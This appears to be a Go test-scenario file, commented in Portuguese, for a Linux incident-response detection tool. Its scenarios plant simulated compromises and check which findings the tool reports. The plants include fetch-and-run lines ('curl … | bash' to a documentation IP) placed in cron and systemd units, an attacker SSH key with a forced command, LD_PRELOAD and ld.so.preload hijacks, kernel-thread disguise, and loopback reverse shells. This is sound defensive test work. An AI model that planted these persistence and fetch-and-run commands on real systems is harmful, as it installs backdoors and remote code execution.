package scenario

// Matriz de userland. O objetivo não é cobrir distro por distro, é provar que a
// ferramenta SONDA em vez de detectar: layouts diferentes de cron, systemd,
// base de pacotes e libc.
var (
	matriz  = []string{"debian:12", "alpine:3.20"}
	minimal = []string{"alpine:3.20"} // rápido, e sem glibc: prova o binário estático

	// Userland de época. O que ele cobre é LAYOUT — base de pacotes rpm, que a
	// matriz principal não tem, e árvore de systemd de outra geração. O que ele
	// NÃO cobre é o kernel: contêiner usa o do host, e por isso os cenários de
	// kernel legado são de VM.
	legado = []string{"centos:7", "debian:9"}
)

// implantes é o conjunto de formas plantado tanto no userland de época quanto
// nos kernels de época. Ser o MESMO texto nos dois é o ponto: a diferença de
// resultado, se houvesse, seria do ambiente e não do plantio.
const implantes = `/helper argv0 "[kworker/0:9]" /helper sleep 300 &
	/helper memfd /helper sleep 300 &
	/helper rwx &
	/helper trace &
	/helper caps 1000 &
	cp /helper /tmp/.x
	/tmp/.x sleep 300 &
	sleep 0.6`

// persistencia é plantada por três cenários: ao vivo, em imagem e como
// negativo. Ser o MESMO texto nos três é o ponto — a diferença de resultado,
// quando houver, é do MODO e não do plantio.
//
// O ld.so.preload vai por ÚLTIMO de propósito: a partir dele todo binário
// dinâmico do contêiner reclama da lib inexistente, e plantar o resto antes
// mantém a saída legível.
const persistencia = `mkdir -p /etc/systemd/system/ssh.service.d /etc/systemd/system/multi-user.target.wants /etc/ld.so.conf.d
	printf '[Service]\nExecStartPre=/tmp/.x\n' > /etc/systemd/system/ssh.service.d/override.conf
	printf '[Unit]\n[Service]\nExecStart=/bin/sh -c "curl -s http://198.51.100.7/a | bash"\nRestart=always\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/updater.service
	ln -sf /etc/systemd/system/updater.service /etc/systemd/system/multi-user.target.wants/updater.service
	printf '[Timer]\nOnUnitActiveSec=45s\n' > /etc/systemd/system/beacon.timer
	printf '/tmp/libs\n' > /etc/ld.so.conf.d/zz.conf
	printf 'LD_PRELOAD=/dev/shm/x.so\n' >> /etc/environment
	printf '/usr/lib/libsysinit.so\n' > /etc/ld.so.preload`

// agendamentoEChaves planta as duas persistências mais COMUNS em invasão real:
// uma linha de cron e uma chave em authorized_keys. Vêm antes de systemd na
// frequência com que aparecem, e depois na ordem em que foram implementadas —
// unit veio primeiro porque o coletor era o mais difícil, não o mais frequente.
const agendamentoEChaves = `mkdir -p /etc/cron.d /var/spool/cron/crontabs /root/.ssh /var/spool/cron/atjobs /etc/ssh/sshd_config.d
	printf '*/7 * * * * root /bin/sh -c "curl -s http://198.51.100.7/a | bash"\n' > /etc/cron.d/zz-update
	printf '@reboot /tmp/.x\n*/3 * * * * /usr/local/bin/beacon\n' > /var/spool/cron/crontabs/root
	printf 'command="/tmp/.k",no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCx kali@attacker\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBx ana@estacao\n' > /root/.ssh/authorized_keys
	printf 'export SSH_CONNECTION="203.0.113.9 51234 10.0.0.5 22"\nexport USER=root\n/tmp/.later\n' > /var/spool/cron/atjobs/a00001019
	printf 'AuthorizedKeysCommand /usr/local/sbin/keyfetch\nAuthorizedKeysCommandUser root\n' > /etc/ssh/sshd_config.d/99-x.conf
	printf 'Port 22\n' > /etc/ssh/sshd_config`

// cadeiaCompleta é uma invasão como ela se parece de VERDADE: não uma forma
// isolada, mas entrada, payload, persistência REDUNDANTE e canal — cada peça
// escolhida para parecer legítima sozinha.
//
// Este plantio produzia `RESULT: OK — 35/35 checks`. Foi ele que expôs que a
// suíte tinha viés de sobrevivência: todo cenário positivo plantava um payload
// que os checks já sabiam ver.
const cadeiaCompleta = `mkdir -p /root/.ssh /etc/systemd/system/multi-user.target.wants /var/spool/cron/crontabs /usr/local/sbin
	printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGx3 systemd-timesync@localhost\n' >> /root/.ssh/authorized_keys
	cp /helper /usr/local/sbin/systemd-oomd-helper
	printf '[Unit]\n[Service]\nExecStart=/usr/local/sbin/systemd-oomd-helper sleep 300\nRestart=always\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/systemd-oomd-helper.service
	ln -sf /etc/systemd/system/systemd-oomd-helper.service /etc/systemd/system/multi-user.target.wants/
	printf '@reboot /usr/local/sbin/systemd-oomd-helper sleep 300\n' > /var/spool/cron/crontabs/root
	printf '\n/usr/local/sbin/systemd-oomd-helper sleep 300 &\n' >> /root/.bashrc
	/usr/local/sbin/systemd-oomd-helper sleep 300 &
	sleep 0.5`

func init() {
	// ---------------------------------------------------------------- negativos
	//
	// Valem tanto quanto os positivos. Um check que dispara em host limpo é
	// ruído que treina o operador a ignorar o relatório inteiro.

	Register(Scenario{
		ID:     "00-limpo",
		Desc:   "contêiner intocado não pode produzir achado nenhum",
		Images: matriz,
		Expect: nil,
		Forbid: []string{
			"proc.memfd_exec", "proc.exe_deleted", "proc.kthread_disguise",
			"proc.suspicious_path", "proc.caps_unexpected", "proc.tracer",
			"proc.maps_rwx_anon", "proc.ns_divergent",
			"correlate.revshell", "net.pivot",
			"persist.ld_preload_global", "persist.ld_so_conf_odd", "persist.env_preload",
			"persist.unit_exec_suspect", "persist.unit_dropin_exec", "persist.timer_frequent",
			"tool.artifact", "tool.binary", "proc.env_tool_marker", "proc.ld_preload_env",
			"persist.cron_suspect", "persist.cron_frequent", "persist.at_job",
			"persist.ssh_forced_command", "persist.sshd_key_source",
			"persist.shell_startup", "persist.bash_env", "persist.trigger_exec",
			"persist.pam_exec", "persist.udev_run",
			"persist.ca_planted", "persist.hosts_override", "persist.web_prepend",
			"correlate.persistence_redundant", "integrity.no_package_owner",
			"priv.uid_zero", "priv.no_password", "priv.service_account_shell",
			"priv.root_equivalent_group",
			// Os checks acrescentados depois. Sem entrarem aqui, um contêiner
			// limpo deixaria de ser a prova de que eles não falam sozinhos — que
			// é o uso principal deste cenário.
			"persist.suid_unowned", "persist.modprobe_install",
			"persist.unit_socket_unowned", "integrity.pkgdb_tampered",
			"integrity.pkg_file_modified",
			"integrity.immutable_flag", "priv.sudo_nopasswd",
			"net.egress_unowned", "net.listener_unowned",
			"kernel.mount_over_system", "kernel.ftrace_hook",
			"auth.bruteforce_success", "antiforense.shell_history",
			"cred.ssh_private_key",
		},
		// O timestomp sai do Forbid por SEVERIDADE, não por inteiro.
		//
		// Um contêiner tem dezenas de arquivos com ctime > mtime: a camada é
		// extraída depois do mtime, e alguns deles são alvo de persistência
		// legítimo (hook de apt, pam.d, /etc/profile). Isso é CONTEXTO — sai
		// como uma linha INFO agregada dizendo "N arquivos compartilham o mesmo
		// ctime ao segundo: extração em massa".
		//
		// Proibir o ID inteiro obrigaria a escolher entre duas coisas ruins:
		// apagar o sinal na coleta (que era o comportamento anterior, e fazia
		// `touch -d` em quatro arquivos no mesmo segundo limpar o rastro) ou
		// deixar o contêiner limpo gritar. O que este cenário protege é
		// silêncio de AÇÃO, e é isso que fica travado.
		ForbidFinding: []Expect{
			{ID: "integrity.timestomp", Sev: "CRITICAL"},
			{ID: "integrity.timestomp", Sev: "WARN"},
		},
		Exit: 0,
		// Orçamento de ruído MEDIDO: silêncio é o contrato deste cenário.
		MaxWarn: SemAvisos,
	})

	Register(Scenario{
		ID:   "01-sem-root",
		Desc: "sem root a cobertura DEGRADA e o exit não pode ser 0",
		// É o invariante central da ferramenta: distinguir "não achei" de
		// "não consegui olhar". Antes da revisão, esta execução saía OK/0 com
		// 246 de 303 processos ilegíveis.
		Images:           matriz,
		User:             "1000",
		Plant:            `sleep 300 &`,
		Exit:             1,
		MustBeIncomplete: true,
		// Orçamento de ruído MEDIDO: silêncio é o contrato deste cenário.
		MaxWarn: SemAvisos,
	})

	Register(Scenario{
		ID:     "02-kthread-real",
		Desc:   "thread de kernel legítima não dispara: ela não tem exe",
		Images: minimal,
		Forbid: []string{"proc.kthread_disguise"},
		Exit:   0,
		// Orçamento de ruído MEDIDO: silêncio é o contrato deste cenário.
		MaxWarn: SemAvisos,
	})

	// ---------------------------------------------------------------- positivos

	Register(Scenario{
		ID:     "10-kthread-disguise",
		Desc:   "implante renomeado com exec -a para se passar por thread de kernel",
		Images: matriz,
		// Duas armadilhas de portabilidade que a matriz revelou:
		//   1. exec -a é builtin do BASH; debian usa dash e alpine usa busybox ash
		//   2. o /bin/sleep do Alpine É o busybox, que despacha pelo argv[0] —
		//      renomeá-lo faz ele procurar um applet inexistente e sair
		// O alvo precisa ser um binário próprio, estático e sem despacho por nome.
		Plant: `/helper argv0 "[kworker/9:2]" /helper sleep 300 &
			sleep 0.4`,
		Expect: []Expect{{ID: "proc.kthread_disguise", Sev: "CRITICAL"}},
		// Não pode confundir com os outros dois checks de exe.
		Forbid:         []string{"proc.memfd_exec"},
		Exit:           2,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:     "11-exe-apagado",
		Desc:   "binário apagado com o processo ainda rodando",
		Images: matriz,
		// Mesma razão do cenário acima: copiar o /bin/sleep do Alpine copia o
		// busybox inteiro, e invocá-lo como ".y" não resolve applet nenhum.
		// O PLANTIO MUDOU DE DIRETÓRIO, e é o conserto de uma contradição antiga
		// entre o que este cenário afirmava e o que ele montava.
		//
		// O comentário abaixo sempre disse que o WARN existe porque "isto
		// acontece em TODA atualização de pacote com o serviço no ar" — e o
		// plantio apagava um binário de /tmp, que é a forma OPOSTA: não existe
		// atualização de pacote que entregue binário ali. A ferramenta lia a
		// diferença certo (o proc.deleted_mapping sobe para CRITICAL em
		// diretório gravável) e o cenário cobrava exit 1, então ele falhava
		// dizendo que o produto errou. O produto não errou; o plantio é que não
		// representava a frase.
		//
		// Agora ele representa: /usr/local/lib é caminho de biblioteca de
		// sistema, e apagar dali com o processo no ar é exatamente o que um
		// upgrade faz. A forma adversarial ganhou cenário próprio, o 11b.
		Plant: `mkdir -p /usr/local/lib
			cp /helper /usr/local/lib/.y
			/usr/local/lib/.y sleep 300 &
			sleep 0.4
			rm -f /usr/local/lib/.y`,
		// WARN, não CRITICAL: é o que acontece em TODA atualização de pacote
		// com o serviço no ar. A severidade precisa refletir isso.
		Expect: []Expect{
			{ID: "proc.exe_deleted", Sev: "WARN"},
			{ID: "proc.deleted_mapping", Sev: "WARN"},
		},
		Forbid:         []string{"proc.memfd_exec"},
		Exit:           1,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:     "11b-exe-apagado-de-diretorio-gravavel",
		Desc:   "o mesmo apagamento, mas o binário rodava de /tmp: aí a explicação de rotina acaba",
		Images: matriz,
		// O contrapeso do 11, e a metade que estava sem cenário.
		//
		// A diferença entre os dois é UMA propriedade — de onde o binário
		// rodava —, e ela é o que separa manutenção de incidente. Um upgrade
		// deixa a biblioteca apagada em /usr/lib; ninguém entrega pacote em
		// /tmp. Sem este par, a suíte não distinguiria uma ferramenta que
		// classifica das que só reportam.
		Plant: `cp /helper /tmp/.y
			/tmp/.y sleep 300 &
			sleep 0.4
			rm -f /tmp/.y`,
		Expect: []Expect{
			// A mesma observação de antes continua saindo, e continua WARN.
			{ID: "proc.exe_deleted", Sev: "WARN"},
			// E a que lê o DIRETÓRIO sobe, porque a história de rotina não
			// alcança /tmp.
			{ID: "proc.deleted_mapping", Sev: "CRITICAL", Evidence: "gravável"},
		},
		Forbid:         []string{"proc.memfd_exec"},
		Exit:           2,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "12-pid1-nao-eh-isento",
		Desc: "PID 1 é avaliado como qualquer outro processo",
		// Regressão do pior achado da revisão: a versão anterior isentava toda
		// a cadeia de ancestrais, e como a caminhada terminava em 1, o PID 1
		// ficava fora de todo check em todo host — junto com o sshd que
		// costuma ser ancestral da sessão de IR.
		Images: minimal,
		Plant:  ``, // o próprio PID 1 do contêiner é o alvo
		Args:   []string{"-v"},
		Exit:   -1,
		// Orçamento de ruído MEDIDO: silêncio é o contrato deste cenário.
		MaxWarn: SemAvisos,
	})

	Register(Scenario{
		ID:   "13-memfd-fileless",
		Desc: "binário executado de memória anônima: nunca esteve em disco",
		// A forma que anula §8 (find), §5.4 (hash) e §24 (pacote) de uma vez:
		// não há caminho, não há inode, não há o que comparar. E matar o
		// processo destrói a única cópia existente.
		Images: matriz,
		Plant: `/helper memfd /helper sleep 300 &
			sleep 0.4`,
		Expect: []Expect{{ID: "proc.memfd_exec", Sev: "CRITICAL"}},
		// memfd tem check próprio: não pode ser contado também como exe apagado.
		Forbid:         []string{"proc.exe_deleted"},
		Exit:           2,
		MustBeComplete: true,
	})

	// -------------------------------------------------- caminho, privilégio, memória

	Register(Scenario{
		ID:     "14-caminho-suspeito",
		Desc:   "binário rodando de /tmp — onde instalação nenhuma põe binário",
		Images: matriz,
		Plant: `cp /helper /tmp/.x
			/tmp/.x sleep 300 &
			sleep 0.4`,
		Expect: []Expect{{ID: "proc.suspicious_path", Sev: "WARN"}},
		// O binário existe e não foi apagado: os checks de exe não têm o que
		// dizer aqui, e contar o mesmo processo três vezes infla a triagem.
		Forbid:         []string{"proc.exe_deleted", "proc.memfd_exec"},
		Exit:           1,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "15-capability-sem-root",
		Desc: "processo de usuário comum com capability que vale por root",
		// Como capability substitui o SUID (runbook §3.7): PR_SET_KEEPCAPS
		// preserva o conjunto permitido através do setuid. `ps` mostra uid 1000
		// e o processo pode virar root a qualquer momento.
		//
		// As duas capabilities usadas estão no conjunto PADRÃO do Docker: o
		// cenário não precisa de --cap-add, e por isso roda na matriz inteira.
		Images: matriz,
		Plant: `/helper caps 1000 &
			sleep 0.5`,
		Expect: []Expect{{ID: "proc.caps_unexpected", Sev: "WARN"}},
		Exit:   1,
		// Trocar de uid zera o flag dumpable, e aí nem o root do contêiner lê
		// o exe daquele processo sem CAP_SYS_PTRACE. A cobertura CAI — e é
		// isso mesmo que a ferramenta precisa dizer.
		MustBeIncomplete: true,
	})

	Register(Scenario{
		ID:   "16-ptrace",
		Desc: "processo sob ptrace: outro processo controla a memória dele",
		// Pai/filho, que é o que ptrace_scope=1 permite — o padrão da maioria
		// das distros. Injeção sem arquivo nenhum (runbook §3.16).
		Images: matriz,
		Plant: `/helper trace &
			sleep 0.6`,
		Expect:         []Expect{{ID: "proc.tracer", Sev: "WARN"}},
		Exit:           1,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "17-rwx-anonimo",
		Desc: "memória gravável, executável e sem arquivo por trás",
		// A assinatura que o malfind procura, e que MemoryDenyWriteExecute=yes
		// torna impossível (runbook §34.1).
		Images: minimal,
		Plant: `/helper rwx &
			sleep 0.4`,
		Expect:         []Expect{{ID: "proc.maps_rwx_anon", Sev: "WARN"}},
		Exit:           1,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "18-jit-de-sistema-nao-dispara",
		Desc: "runtime com JIT em diretório de sistema é pulado",
		// O descarte que decide se o check é usável: sem ele, todo host com Java
		// ou Node vira parede de aviso. A outra metade do par — o mesmo nome
		// rodando de /tmp, que NÃO é isentado — está no teste unitário, porque
		// depende só da regra e não do /proc.
		Images: minimal,
		// O DONO DE PACOTE não é enfeite do plantio: é metade da regra.
		//
		// A isenção exigia só nome de runtime + diretório de sistema, e a matriz
		// adversarial mostrou o bypass — plantar um binário chamado `node` em
		// /usr/bin comprava o silêncio. O 900c5eb fechou isso exigindo que algum
		// pacote reivindique o arquivo, e este cenário passou a plantar um
		// runtime INSTALADO, que é o que ele sempre quis representar. O bypass
		// virou cenário próprio, o 18b.
		Plant: `cp /helper /usr/bin/node
			` + registraDonoDePacote("/usr/bin/node", "nodejs") + `
			/usr/bin/node rwx &
			sleep 0.4`,
		Forbid: []string{"proc.maps_rwx_anon", "proc.suspicious_path"},
		// E o silêncio vem ACOMPANHADO: isenção é decisão de não olhar, e decisão
		// de não olhar que não aparece na cobertura é a mentira que esta
		// ferramenta existe para não cometer.
		ExpectGap:        []string{"runtime com JIT em diretório de sistema"},
		MustBeIncomplete: true,
		Exit:             1,
		// Orçamento de ruído MEDIDO: runtime instalado não produz achado nenhum.
		MaxWarn: SemAvisos,
	})

	Register(Scenario{
		ID:   "18b-nome-de-runtime-sem-pacote-nao-compra-isencao",
		Desc: "o MESMO nome de runtime, no MESMO diretório de sistema, sem dono de pacote: a isenção não vale",
		// O contrapeso do 18, e ele existe porque o bypass foi ENCONTRADO, não
		// imaginado: a matriz adversarial plantou um binário chamado `node` em
		// diretório de sistema e comprou com isso o silêncio do §3.10.
		//
		// A regra passou a exigir as três coisas juntas — nome de runtime,
		// diretório de sistema e dono de pacote. Aqui só faltam a terceira, e o
		// achado tem que sair. É a diferença entre "isento porque é o runtime da
		// distribuição" e "isento porque escolheu o nome certo".
		Images: minimal,
		Plant: `cp /helper /usr/bin/node
			/usr/bin/node rwx &
			sleep 0.4`,
		Expect: []Expect{
			{ID: "proc.maps_rwx_anon", Sev: "WARN"},
			// E a propriedade continua dizendo o resto da história.
			{ID: "integrity.no_package_owner", Sev: "CRITICAL", Subject: "/usr/bin/node"},
		},
		Exit: 2,
	})

	Register(Scenario{
		ID:   "19-namespace-proprio",
		Desc: "unshare fora de container e fora de unit: esconderijo sem rootkit",
		// Explica os dois "impossíveis" da §3.15 sem precisar de rootkit — o
		// arquivo que o `ls` não acha e a conexão que o `ss` não lista. O
		// cgroup aqui é `/`: nem container nem unit, que são os dois descartes.
		Images: matriz,
		Caps:   []string{"SYS_ADMIN"}, // unshare exige
		Plant: `unshare -n /helper sleep 300 &
			sleep 0.5`,
		Expect: []Expect{{ID: "proc.ns_divergent", Sev: "WARN"}},
		// E ele virou também o cenário que trava um falso positivo caro,
		// descoberto quando a fase 8 entrou.
		//
		// SYS_ADMIN é o que faz a bpf(2) responder dentro de um contêiner — e aí
		// a enumeração funciona e a ATRIBUIÇÃO não: o espaço de ids do eBPF é
		// global, então são os programas do HOST que aparecem, e os processos
		// que os seguram estão fora deste namespace de PID. Na primeira medição
		// isso deu 46 programas não atribuíveis e um CRÍTICO contra um programa
		// legítimo da máquina que rodava a suíte.
		//
		// A cobertura deixou de ser completa aqui de propósito: a ferramenta
		// enumerou 47 programas e não pôde responder por nenhum. Dizer isso é o
		// contrato; dizer "completo" seria a mentira.
		Forbid:           []string{"kernel.bpf_unowned"},
		Exit:             1,
		MustBeIncomplete: true,
	})

	// ------------------------------------------------------- userland de época

	Register(Scenario{
		ID:   "27-rpm-declara-a-lacuna",
		Desc: "base de pacotes do rpm é binária: a ferramenta DIZ que não pôde perguntar",
		// O contrário do silêncio: numa distribuição rpm a propriedade de
		// pacote não é consultável nativamente, e 63 binários em execução ficam
		// sem resposta. Reportar isso como "nenhum sem dono" seria a mentira
		// exata que a ferramenta existe para não contar.
		Images: []string{"centos:7"},
		Forbid: []string{"integrity.no_package_owner"},
		// A lacuna é cobrada onde ela VIVE — na cobertura —, e não no texto do
		// relatório, que só imprime o motivo com --coverage ou -v.
		ExpectGap:        []string{"não pôde ser consultada"},
		MustBeIncomplete: true,
		Exit:             1,
		// Orçamento de ruído MEDIDO: silêncio é o contrato deste cenário.
		MaxWarn: SemAvisos,
	})

	Register(Scenario{
		ID:     "28-userland-legado-limpo",
		Desc:   "userland de época intocado não pode produzir achado",
		Images: []string{"debian:9"},
		Forbid: []string{
			"proc.memfd_exec", "proc.exe_deleted", "proc.kthread_disguise",
			"proc.suspicious_path", "proc.caps_unexpected", "proc.tracer",
			"proc.maps_rwx_anon", "proc.ns_divergent",
			"correlate.revshell", "net.pivot",
			"persist.ld_preload_global", "persist.ld_so_conf_odd", "persist.env_preload",
			"persist.unit_exec_suspect", "persist.unit_dropin_exec", "persist.timer_frequent",
			"tool.artifact", "tool.binary", "proc.env_tool_marker", "proc.ld_preload_env",
			"persist.cron_suspect", "persist.cron_frequent", "persist.at_job",
			"persist.ssh_forced_command", "persist.sshd_key_source",
			"persist.shell_startup", "persist.bash_env", "persist.trigger_exec",
			"persist.pam_exec", "persist.udev_run",
			"persist.ca_planted", "persist.hosts_override", "persist.web_prepend",
			"correlate.persistence_redundant", "integrity.no_package_owner",
			"priv.uid_zero", "priv.no_password", "priv.service_account_shell",
			"priv.root_equivalent_group",
			// Os checks acrescentados depois. Sem entrarem aqui, um contêiner
			// limpo deixaria de ser a prova de que eles não falam sozinhos — que
			// é o uso principal deste cenário.
			"persist.suid_unowned", "persist.modprobe_install",
			"persist.unit_socket_unowned", "integrity.pkgdb_tampered",
			"integrity.pkg_file_modified",
			"integrity.immutable_flag", "priv.sudo_nopasswd",
			"net.egress_unowned", "net.listener_unowned",
			"kernel.mount_over_system", "kernel.ftrace_hook",
			"auth.bruteforce_success", "antiforense.shell_history",
			"cred.ssh_private_key",
		},
		// Mesma razão do 00-limpo: ctime em lote é contexto da imagem, e o que
		// este cenário protege é silêncio de AÇÃO.
		ForbidFinding: []Expect{
			{ID: "integrity.timestomp", Sev: "CRITICAL"},
			{ID: "integrity.timestomp", Sev: "WARN"},
		},
		Exit: 0,
		// Orçamento de ruído MEDIDO: silêncio é o contrato deste cenário.
		MaxWarn: SemAvisos,
	})

	Register(Scenario{
		ID:   "29-userland-legado-implante",
		Desc: "userland de época não muda o que a ferramenta enxerga",
		// A ferramenta é ELF estático e lê /proc direto, sem chamar binário do
		// host (SPEC 4). Se a distribuição importasse para o resultado, é aqui
		// que apareceria.
		Images: legado,
		Plant:  implantes,
		Expect: []Expect{
			{ID: "proc.kthread_disguise", Sev: "CRITICAL"},
			{ID: "proc.memfd_exec", Sev: "CRITICAL"},
			{ID: "proc.suspicious_path", Sev: "WARN"},
		},
		Exit: 2,
	})

	Register(Scenario{
		ID:   "30-32-bits",
		Desc: "binário de 32 bits enxerga o mesmo: servidor i686 legado ainda existe",
		// Prova o BINÁRIO de 32 bits contra /proc real — tamanho de int, número
		// de syscall, parsing de campo de 64 bits em máquina de 32. O kernel
		// aqui continua sendo o do host: um kernel de 32 bits é o cenário 54.
		Images: legado,
		Arch:   "386",
		Plant:  implantes,
		Expect: []Expect{
			{ID: "proc.kthread_disguise", Sev: "CRITICAL"},
			{ID: "proc.memfd_exec", Sev: "CRITICAL"},
		},
		Exit: 2,
	})

	Register(Scenario{
		ID:   "31-sem-os-release",
		Desc: "distribuição anterior ao os-release não pode quebrar o cabeçalho",
		// RHEL 6 e anteriores só têm /etc/redhat-release. O cabeçalho perde o
		// nome da distribuição e SEGUE — degradar não é falhar.
		Images: legado,
		Plant: `rm -f /etc/os-release /usr/lib/os-release
			cp /helper /tmp/.x
			/tmp/.x sleep 300 &
			sleep 0.4`,
		Expect: []Expect{{ID: "proc.suspicious_path", Sev: "WARN"}},
		Exit:   1,
	})

	Register(Scenario{
		ID:   "32-cota-de-cpu",
		Desc: "cota de cgroup é lida: o runtime do Go não a enxerga",
		// `runtime.NumCPU()` respeita AFINIDADE (taskset, cpuset) mas não a
		// cota do CFS. Num contêiner de meia CPU ele reporta as 12 do host, e
		// a coleta abriria oito leitores paralelos onde cabe um — entregando
		// mais trabalho ao throttling num host já sob incidente.
		Images:       minimal,
		CPUs:         "0.5",
		ExpectOutput: []string{"cota 0.5"},
		Exit:         -1,
		// Orçamento de ruído MEDIDO: silêncio é o contrato deste cenário.
		MaxWarn: SemAvisos,
	})

	// ------------------------------------------------------------------- rede
	//
	// Os quatro cenários abaixo existem em pares: uma forma que precisa
	// disparar e a forma LEGÍTIMA quase idêntica que não pode. É o par que dá
	// valor — sozinho, o positivo não prova que o check discrimina.
	//
	// Endereço público sem rede: `--network=none` mais apelidos em `lo`. Para
	// quem classifica, 198.51.100.241 é público; para a máquina, nada sai do
	// namespace.

	Register(Scenario{
		ID:        "40-revshell",
		Desc:      "fd 0, 1 e 2 no mesmo socket, saindo para endereço público",
		Images:    minimal,
		Caps:      []string{"NET_ADMIN"},
		NoNetwork: true,
		Plant: `ip link set lo up
			ip addr add 198.51.100.241/32 dev lo
			/helper listen 198.51.100.241:9001 &
			sleep 0.4
			/helper revshell 198.51.100.241:9001 &
			sleep 0.5`,
		Expect: []Expect{{ID: "correlate.revshell", Sev: "CRITICAL"}},
		// O outro lado da conexão está no mesmo host e no mesmo namespace: o
		// processo que ESCUTA não pode ser lido como pivô nem como shell.
		Forbid:         []string{"net.pivot"},
		Exit:           2,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "R2-revshell-por-ponte",
		Desc: "reverse shell INDIRETO: o shell lê de um pipe, a ponte segura o pipe E o socket de saída",
		// A variante da §17 que o correlate.revshell não vê: o shell não toca a
		// rede. Ele lê de um pipe, e um segundo processo — a ponte, o socat/python
		// no meio — segura o outro lado do pipe e o socket que fala com o C2. É
		// WARN, não CRITICAL: precisa de mais peças para casar e um agente de
		// acesso remoto legítimo tem a mesma forma, então a proveniência da ponte
		// é o que o operador usa para decidir. Provado no test/matrix; aqui ganha
		// cenário Go — a mesma ponte, medida contra a CLI de verdade.
		Images:    minimal,
		Caps:      []string{"NET_ADMIN"},
		NoNetwork: true,
		Plant: `ip link set lo up
			ip addr add 198.51.100.241/32 dev lo
			/helper listen 198.51.100.241:9001 &
			sleep 0.4
			/helper revshell-bridge 198.51.100.241:9001 &
			sleep 1`,
		Expect: []Expect{
			{ID: "correlate.revshell_bridge", Sev: "WARN", Evidence: "lê do pipe"},
		},
		// A forma PURA não pode disparar aqui: o shell não tem o socket nos seus
		// próprios descritores padrão — é justamente o que torna esta variante
		// mais fraca e a ponte necessária.
		Forbid: []string{"correlate.revshell"},
		Exit:   1,
	})

	Register(Scenario{
		ID:   "41-socket-activation-nao-eh-revshell",
		Desc: "ativação por socket tem a MESMA forma e não pode disparar",
		// O falso positivo que a revisão de código encontrou. systemd com
		// StandardInput=socket e inetd entregam o socket em fd 0, 1 e 2 — igual
		// a um shell reverso. O que separa é a DIREÇÃO, e este cenário é o que
		// impede alguém de "simplificar" o check removendo essa checagem.
		//
		// Roda na matriz inteira e sem privilégio de rede: loopback basta,
		// porque o que está sob teste é a direção, não o escopo do peer.
		Images: matriz,
		Plant: `/helper accept 127.0.0.1:9002 &
			sleep 0.4
			/helper connect 127.0.0.1:9002 &
			sleep 0.5`,
		Forbid: []string{"correlate.revshell", "net.pivot"},
		// -1: o binário do rig fica em /helper e nenhum pacote o reivindica —
		// verdade que o integrity.no_package_owner diz com razão, e que o exit
		// reflete. O que este cenário afirma é o Forbid.
		Exit:           -1,
		MustBeComplete: true,
		// Orçamento de ruído MEDIDO: silêncio é o contrato deste cenário.
		MaxWarn: SemAvisos,
	})

	Register(Scenario{
		ID:        "42-pivot",
		Desc:      "mesmo processo com saída externa e saída interna: a VM é caminho",
		Images:    minimal,
		Caps:      []string{"NET_ADMIN"},
		NoNetwork: true,
		Plant: `ip link set lo up
			ip addr add 198.51.100.241/32 dev lo
			ip addr add 10.0.0.9/32 dev lo
			/helper listen 198.51.100.241:9001 &
			/helper listen 10.0.0.9:9002 &
			sleep 0.4
			/helper connect 198.51.100.241:9001 10.0.0.9:9002 &
			sleep 0.5`,
		Expect: []Expect{{ID: "net.pivot", Sev: "WARN"}},
		// Sem dup2 sobre os descritores padrão não há assinatura de shell: os
		// dois checks olham a mesma tabela e não podem se confundir.
		Forbid:         []string{"correlate.revshell"},
		Exit:           1,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "43-proxy-reverso-nao-eh-pivo",
		Desc: "proxy reverso fala com os dois lados e NÃO é pivô",
		// O defeito que a revisão encontrou no check: sem direção, todo nginx
		// que serve tráfego público virava pivô. A diferença é inteira aqui —
		// tráfego externo de ENTRADA, não de saída.
		Images:    minimal,
		Caps:      []string{"NET_ADMIN"},
		NoNetwork: true,
		Plant: `ip link set lo up
			ip addr add 198.51.100.241/32 dev lo
			ip addr add 10.0.0.9/32 dev lo
			/helper listen 10.0.0.9:9002 &
			sleep 0.3
			/helper proxy 198.51.100.241:9001 10.0.0.9:9002 &
			sleep 0.3
			/helper connect 198.51.100.241:9001 &
			sleep 0.5`,
		Forbid:         []string{"net.pivot", "correlate.revshell"},
		Exit:           -1, // idem 41: o /helper do rig não tem dono de pacote
		MustBeComplete: true,
		// Orçamento de ruído MEDIDO: o binário do rig e as duas pontas do proxy: medido, não opinado.
		MaxWarn: 3,
	})

	Register(Scenario{
		ID:   "44-wtf-revshell",
		Desc: "wtf enxerga o que precisa ser enxergado em 1s, e sai com o mesmo código",
		// O wtf tem seleção, orçamento e renderização próprios. O que NÃO pode
		// mudar é o contrato: mesmo JSONL, mesmo exit code — é por ele que a
		// triagem de frota se ordena.
		Images:    minimal,
		Cmd:       "wtf",
		Caps:      []string{"NET_ADMIN"},
		NoNetwork: true,
		Plant: `ip link set lo up
			ip addr add 198.51.100.241/32 dev lo
			/helper listen 198.51.100.241:9001 &
			sleep 0.4
			/helper revshell 198.51.100.241:9001 &
			sleep 0.5`,
		Expect: []Expect{{ID: "correlate.revshell", Sev: "CRITICAL"}},
		Exit:   2,
		// COBERTURA COMPLETA NÃO É CONTRATO DO `wtf`, e cobrá-la aqui era cobrar
		// o oposto do que a SPEC 6.1 promete.
		//
		// O `wtf` tem teto rígido de 2s para o host inteiro; o que não couber
		// "vira NÃO VERIFICADO e sai no rodapé". A sondagem de PID por sinal
		// custa ~0,4s sozinha e por isso não roda ali — a decisão está em
		// facts/crossview.go, e ela existe porque a alternativa medida era pior:
		// deixá-la consumir o orçamento derrubava SEIS coletores que não têm
		// nada a ver com PID, e limitá-la ao prazo restante zerava a varredura
		// inteira (0/89).
		//
		// O que este cenário tem o direito de cobrar é o que o wtf promete: mesmo
		// JSONL, mesmo exit code, e a lacuna DITA em vez de escondida.
		ExpectGap: []string{"este comando tem teto de tempo"},
	})

	// ------------------------------------------------------- persistência (§7)
	//
	// A primeira família de checks que NÃO depende de /proc. Por isso ela tem
